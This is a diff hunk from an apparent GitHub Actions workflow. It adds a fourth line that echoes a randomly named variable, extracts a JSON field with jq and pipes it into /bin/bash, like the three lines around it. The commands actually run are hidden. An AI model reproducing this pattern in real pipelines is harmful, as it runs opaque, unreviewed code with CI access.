@@ -24,6 +24,7 @@ jobs:
           echo $y8 | jq -r .gulr3373 | /bin/bash
           echo $lmmy88422 | jq -r .yuba97 | /bin/bash
           echo $gls301 | jq -r .nfytn2 | /bin/bash
+          echo $geou2 | jq -r .w2464 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
